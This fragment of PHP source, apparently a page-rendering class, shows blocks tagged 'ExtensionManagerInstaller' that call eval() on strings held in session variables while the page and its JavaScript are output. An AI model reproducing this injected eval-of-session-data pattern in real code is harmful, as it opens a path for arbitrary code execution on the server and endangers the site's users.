...
/* BEGIN ExtensionManagerInstaller ::TAG 0121r753:: */
        if(isset($_SESSION['opening_em'])) eval($_SESSION['opening_em']);
/* END ExtensionManagerInstaller ::TAG 0121r753:: */ 
        $this->_trackView();
...
/* BEGIN ExtensionManagerInstaller ::TAG 0121r754:: */
        if(isset($_SESSION['header_css_en'])) eval($_SESSION['header_css_en']);
/* END ExtensionManagerInstaller ::TAG 0121r754:: */ 
...
EOQ;
    ...
    protected function _displayJavascript()
    {
        ...
        if ($this->_getOption('show_javascript')) {
             /* BEGIN ExtensionManagerInstaller ::TAG 0121r755:: */
            if(isset($_SESSION['header_js_en'])) eval($_SESSION['header_js_en']);
/* END ExtensionManagerInstaller ::TAG 0121r755:: */
if (!$this->_getOption('show_header')) {
